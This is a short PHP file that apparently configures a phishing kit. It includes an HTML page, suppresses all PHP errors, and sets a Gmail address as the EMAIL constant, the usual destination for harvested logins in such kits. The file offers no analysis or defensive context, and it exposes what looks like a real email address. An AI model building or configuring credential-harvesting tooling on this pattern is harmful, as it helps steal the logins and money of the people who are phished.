<?php
include('direct.html');
error_reporting(0);
$ur_email   = "allensteve491@gmail.com";
define("EMAIL", "$ur_email");
?>